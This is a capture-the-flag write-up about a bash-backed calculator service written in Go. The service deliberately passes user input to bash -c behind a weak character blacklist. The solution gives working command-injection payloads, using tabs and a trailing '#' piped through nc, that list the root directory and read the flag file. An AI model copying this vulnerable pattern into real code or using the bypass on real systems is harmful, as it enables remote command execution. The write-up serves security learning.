# Misc

## Description

I've made the coolest calculator. It's pretty simple, I don't need to parse the input and take care of execution order, bash does it for me! I've also made sure to remove characters like $ or "\`" to not allow code execution, that will surely be enough.

## Source

```go
package main

import (
	"bufio"
	"context"
	"fmt"
	"net"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"time"
)

const (
	connHost = "0.0.0.0"
	connPort = "1337"
	connType = "tcp"
)

func main() { // Used to stablish connections with the clients (not part of the challenge)
	fmt.Println("Starting " + connType + " server on " + connHost + ":" + connPort)
	l, err := net.Listen(connType, connHost+":"+connPort)
	if err != nil {
		fmt.Println("Error listening: ", err.Error())
		os.Exit(1)
	}
	defer l.Close()

	for {
		conn, err := l.Accept()
		if err != nil {
			continue
		}

		fmt.Println("Client " + conn.RemoteAddr().String() + " connected.")

		go minConnection(conn)
		go handleConnection(conn)
		defer conn.Close()
	}
}

func minConnection(conn net.Conn) {
	time.Sleep(600 * time.Second)
	conn.Close()
}

type LocalShell struct{}

func (_ LocalShell) Execute(ctx context.Context, cmd string) ([]byte, error) {
	wrapperCmd := exec.CommandContext(ctx, "bash", "-c", cmd)
	return wrapperCmd.Output()
}

func handleConnection(conn net.Conn) {
	conn.Write([]byte("CALCULATOR\n"))
	for {
		conn.Write([]byte("\nOperation: "))
		buffer, err := bufio.NewReader(conn).ReadBytes('\n')
		if err != nil {
			conn.Close()
			return
		}
		op := string(buffer[:len(buffer)-1]) 
        firewall := []string{" ", "`", "$", "&", "|", ";", ">"}
		for _, v := range firewall {
			opL1 := len(op)
			op = strings.ReplaceAll(op, v, "")
			opL2 := len(op)
			if opL1 > opL2 {
				conn.Write([]byte(strconv.Itoa(opL1-opL2) + "	'" + v + "' removed\n"))
			}
		}
		shell := LocalShell{}
		command := "echo $((" + op + "))" 
		output, _ := shell.Execute(context.Background(), command)
		fmt.Println(conn.RemoteAddr().String() + ": " + command + " " + string(output))
		conn.Write(output)
	}
}
```

## Solution

The main part of the challenge is `handleConnection`. It takes our input and sends it to `command := "echo $((" + input + "))"`, but there's a restriction on what we can use.

The `$(())` is called [3.5.5 Arithmetic Expansion](https://www.gnu.org/software/bash/manual/html_node/Arithmetic-Expansion.html). It takes arithmetical expression and evaluates it to integer.

Bash is strict with it's syntax sometimes and if you break it something unexpected happens, like:
```bash
└─$ echo $(( whoami ))  # No Space
0

└─$ echo $(( whoami ) ) # With space
woyag
```

There's 2 filters we must bypass.
1. Leading `))`
2. Spaces

`#` is not blocked so we can ignore the leading `))`, `)` is not blocked so we can inject them and for spaces we can use tabs (`\t`)

```bash
# └─$ echo $'ls\t/\t)\t)\t#' | nc 94.237.53.113 54904
└─$ echo 'ls / ) ) #' | tr ' ' '\t' | nc 94.237.53.113 54904
CALCULATOR

Operation: bin calculator dev etc flag.txt home lib media mnt opt proc root run sbin srv sys tmp usr var
# └─$ echo $'cat\t/flag.txt\t)\t)\t#' | nc 94.237.53.113 54904
└─$ echo 'cat /flag.txt ) ) #' | tr ' ' '\t' | nc 94.237.53.113 54904
CALCULATOR

Operation: HTB{Ju4nck3r_15_y0ur_n4m3_15nt_1t?}
```

